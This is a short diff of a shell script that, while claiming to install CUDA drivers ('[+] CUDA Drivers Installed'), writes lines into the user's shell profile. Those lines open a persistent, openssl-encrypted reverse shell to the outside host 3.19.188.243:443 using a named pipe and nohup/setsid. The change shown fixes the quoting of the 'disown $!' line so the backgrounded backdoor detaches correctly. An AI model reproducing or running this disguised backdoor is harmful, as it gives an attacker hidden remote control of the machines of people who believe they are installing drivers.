@@ -14,14 +14,14 @@ then
 	echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
-    echo "disown $!" >> $PROFILE
+    echo 'disown $!' >> $PROFILE
 
 else
 	touch $PROFILE
     echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
-    echo "disown $!" >> $PROFILE
+    echo 'disown $!' >> $PROFILE
 fi
 
 echo "[+] CUDA Drivers Installed"
